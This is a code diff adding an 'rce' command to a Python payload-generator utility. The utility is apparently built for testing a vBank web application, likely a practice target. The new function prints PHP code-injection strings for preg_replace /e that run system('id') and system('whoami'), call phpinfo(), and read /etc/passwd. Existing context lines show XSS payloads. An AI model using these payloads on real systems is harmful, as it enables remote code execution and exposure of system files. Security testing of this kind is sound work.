@@ -51,6 +51,16 @@ class VBankUtils:
             'svg_script': '<svg onload="alert(\'XSS\')">',
         }
 
+    @staticmethod
+    def rce_payloads():
+        """Return common RCE payloads for preg_replace /e"""
+        return {
+            'id': 'test"; system(\'id\'); echo "',
+            'whoami': 'test"; system(\'whoami\'); echo "',
+            'phpinfo': 'test"; phpinfo(); echo "',
+            'read_passwd': 'test"; echo file_get_contents(\'/etc/passwd\'); echo "',
+        }
+
 def main():
     parser = argparse.ArgumentParser(description='vBank Utility - Account number conversion and payload generation')
     subparsers = parser.add_subparsers(dest='command', help='Commands')
@@ -68,6 +78,7 @@ def main():
     # Payloads
     subparsers.add_parser('sql', help='Show SQL injection payloads')
     subparsers.add_parser('xss', help='Show XSS payloads')
+    subparsers.add_parser('rce', help='Show RCE payloads')
     
     # Info
     subparsers.add_parser('info', help='Show vBank configuration information')
@@ -116,6 +127,14 @@ def main():
             print(f"\n[{name}]")
             print(f"  {payload}")
     
+    elif args.command == 'rce':
+        print("Common RCE Payloads (preg_replace /e):")
+        print("=" * 60)
+        payloads = VBankUtils.rce_payloads()
+        for name, payload in payloads.items():
+            print(f"\n[{name}]")
+            print(f"  {payload}")
+
     elif args.command == 'info':
         print("vBank Configuration:")
         print("=" * 60)
